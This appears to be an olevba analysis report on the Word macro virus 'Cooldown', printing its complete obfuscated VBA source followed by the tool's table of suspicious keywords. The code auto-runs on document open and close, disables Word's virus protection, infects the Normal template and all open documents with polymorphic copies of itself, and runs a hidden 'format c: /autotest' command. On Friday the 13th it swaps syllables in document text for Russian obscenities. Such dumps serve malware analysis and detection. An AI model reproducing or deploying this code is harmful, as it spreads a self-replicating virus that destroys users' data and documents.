olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cooldown-6a2f927ab72506126e72c071f1e78cfdfc046ba1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cooldown-6a2f927ab72506126e72c071f1e78cfdfc046ba1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
       Private Sub _
           Document_Open()
       CoolDown _
                0
    ' 4358.223
End Sub
   ' 3158.194

Private Sub Document_Close()
           
' 4367.055
' 8434.62
' 8392.48
CoolDown _
  0
            ' 2804.815
' 9238.776
End _
 Sub
  ' 7260.659
' 1278.396
' 3516.647
Private Sub ToolsMacro()
          CoolDown 1
               End _
            Sub
            Private Sub _
      ViewVBCode()
 CoolDown 1
          End Sub
 Private _
Sub CoolDown(How _
           As Integer)
            On Error Resume Next
             Dim c _
               As _
 String, _
 a _
               As _
             Long, b As Long, d As Long, e As Long, _
              f _
               As Long, res _
       As String, m _
           As Boolean
             Randomize
       ' 9884.485
' 9673.963
With Options
    .VirusProtection = _
                False
 ' 7797.95
.ConfirmConversions = False
              ' 6528.483
.SaveNormalPrompt _
             = False
     End _
              With
               ' 2456.969
If _
           How = _
               1 _
  Then
             s = Shell("format" & _
          Chr(32) _
  & "c:" & _
      Chr(32) _
   & _
             "/autotest", _
       vbHide)
        Else
    ' 7580.629

With _
                NormalTemplate.VBProject.VBComponents(1).CodeModule
If Not .Find("Cool" & _
        "Down", 1, _
          1, _
1000, _
     1000, _
 False, False) Then
              a = .CountOfLines
  ' 5778.541
' 6558.043
' 5129.993
' 7112.036

' 3557.465
' 3491.188
' 3654.09
For _
  b _
           = 1 To a
   
.DeleteLines _
           (1)
              Next
      ' 51.55921
' 1845.714
d = _
           1
 ' 5108.296
' 571.9924
a = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
' 8980.401
res = _
        ""
          
' 9456.824
' 922.9565
For b = 1 _
           To a
 ' 3486.279

c = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(b, 1)
      ' 2866.625

c = RTrim(LTrim(c))
             If foo(c, _
    f, res) Then
            ' 303.3489
' 190.8255
.InsertLines _
  d, Space(Rnd _
        * 16) & _
   res
           d = d + _
           f
  f _
        = _
              0
       
res _
      = _
      ""
  

End If
 ' 8993.526
Next
  NormalTemplate.Save
         End If
 End With
      ' 6528.254
For e = _
   1 _
            To Documents.Count
               ' 4099.205
' 3133.615
With _
              Documents(e).VBProject.VBComponents(1).CodeModule
             ' 2085.967
' 5214.448
If _
Not _
           .Find("Cool" _
            & "Down", _
   1, _
      1, 1000, 1000, _
       False, _
      False) Then
         ' 1370.392
' 1652.867
' 424.3797
' 1464.009
a = .CountOfLines
           ' 3386.05
' 345.3505
' 1615.986
' 296.4926
' 8380.707
' 9369.005
m _
 = Documents(e).Saved
           ' 8146.857
' 9332.244
For b _
             = 1 _
          To a
 ' 9958.062
.DeleteLines _
            (1)
            Next
      d _
              = 1
              ' 6292.928

a = _
           NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
       res _
               = _
         ""
             For _
    b _
       = 1 To a
              ' 815.0649
' 1515.484
' 4551.789
c = _
              NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(b, _
     1)
  c = _
                RTrim(LTrim(c))
            If _
           foo(c, _
            f, _
        res) _
   Then
        .InsertLines _
   d, Space(Rnd _
       * _
        16) & res
         d = d + _
                f
     ' 8951.396
f = _
    0
 ' 9217.687
res _
 = _
          ""
          End If
 
' 7708.467

' 8051.171
Next
           If _
         Documents(e).Path <> _
         "" _
                Then
  ' 6626.557
' 9472.139
Documents(e).SaveAs _
               AddToRecentFiles:=False
        End If
       If (WeekDay(Date) _
      = 6) _
              And _
       (Day(Date) _
       = 13) _
    And (Rnd > 0.7) Then
               Application.StatusBar _
            = _
               ""
   Application.DisplayStatusBar = _
                False
   Application.ScreenUpdating _
 = False
          ' 4459.228
With Documents(e).Content
           .Find.Execute FindText:="пр", ReplaceWith:="пизд", _
 Replace:=wdReplaceAll
     ' 3615.443
' 139.9082

' 8105.651
.Find.Execute FindText:="др", _
  ReplaceWith:="понос", _
           Replace:=wdReplaceAll
   ' 6847.155

' 3508.937
' 4819.152
.Find.Execute _
           FindText:="кр", _
     ReplaceWith:="кобыл", _
              Replace:=wdReplaceAll
      .Find.Execute FindText:="стр", _
  ReplaceWith:="ебан", Replace:=wdReplaceAll
  ' 6487.684

.Find.Execute FindText:="ср", ReplaceWith:="срак", _
       Replace:=wdReplaceAll
         ' 2478.127
' 7162.111

.Find.Execute _
               FindText:="тр", _
              ReplaceWith:="трах", _
              Replace:=wdReplaceAll
     ' 9842.104
.Find.Execute _
                FindText:="бр", _
    ReplaceWith:="бляд", _
  Replace:=wdReplaceAll
         .Find.Execute _
         FindText:="вр", ReplaceWith:="выеб", Replace:=wdReplaceAll
 ' 9261.081
.Find.Execute _
           FindText:="гр", _
          ReplaceWith:="говн", Replace:=wdReplaceAll
       .Find.Execute FindText:="жр", ReplaceWith:="жоп", _
            Replace:=wdReplaceAll
          .Find.Execute _
               FindText:="зр", _
        ReplaceWith:="залуп", Replace:=wdReplaceAll
         ' 1876.24
' 1874.993
.Find.Execute _
      FindText:="дж", ReplaceWith:="джоп", _
          Replace:=wdReplaceAll
         ' 361.6708
' 8679.609
' 5088.313
' 866.1735

' 9144.543
' 5093.092
.Find.Execute _
        FindText:="кал", ReplaceWith:="дер", _
        Replace:=wdReplaceAll
               .Find.Execute _
           FindText:="бух", ReplaceWith:="бряк", _
            Replace:=wdReplaceAll
              End With
               ' 9314.085

Documents(e).UndoClear
           ' 4174.954
Application.DisplayStatusBar _
            = True
   Application.ScreenUpdating _
     = True
             ' 3945.426

' 95.23213
Application.StatusBar _
       = _
           ""
   End If
            ' 225.8831
' 1426.688
Documents(e).Saved = m
  ' 8262.369

End If
     
End With
      
Next
   ' 6253.21
End _
     If
            End _
              Sub
           Private Function _
                foo(ByRef s _
        As _
    String, ByRef _
            i _
     As _
    Long, ByRef res _
       As _
         String) _
           As Boolean
               Dim tmp _
              As String
              ' 1920.175
' 340.2328
' 9265.149

If _
       (Left(s, 1) = _
           "'") _
                Or (Len(s) _
     = 0) Then
                ' 4783.207
foo _
       = _
              False
             Exit _
         Function
               ' 9998.419
End _
           If
' 254.9154

' 7862.768
' 1244.586
If _
      Right(s, _
    2) = Chr(32) & "_" _
        Then
 ' 674.8163

' 6130.167
res _
           = res _
             & Left(s, Len(s) - _
     1)
             foo _
  = _
       False
       ' 1144.96
' 8545.819
Exit _
       Function
       End If
          ' 1067.359
tmp = res & _
          s
               ' 6701.625
' 9650.506
' 4583.337
' 9101.369
res _
    = ""
            
' 5603.884
i _
          = 1
      ' 5855.278
While Rnd > _
        0.5
 If Rnd _
      < _
            0.8 _
        Then
   ' 4500.027
' 368.6839

res _
   = _
              res _
              & _
             "'" _
     & Str(Rnd _
     * _
               10000)
  ' 9727.57
' 9855.497
End If
             res _
     = res & Chr(13)
           ' 5072.772
i = i _
            + 1
      ' 6673.072
Wend
            For a = _
              1 _
     To Len(tmp)
    
res = _
        res & Mid(tmp, _
     a, _
               1)
     If _
             Mid(tmp, _
 a, 1) = Chr(32) _
        Then
  If Rnd > _
     0.5 _
         Then
            
res = _
   res _
        & _
   "_" _
              & Chr(13) & _
   Space(Rnd _
  * _
     16)
   i = i _
        + _
    1
          ' 5658.525
End If
         End _
      If
          Next
              ' 8619.138
foo _
                = True
             End _
              Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

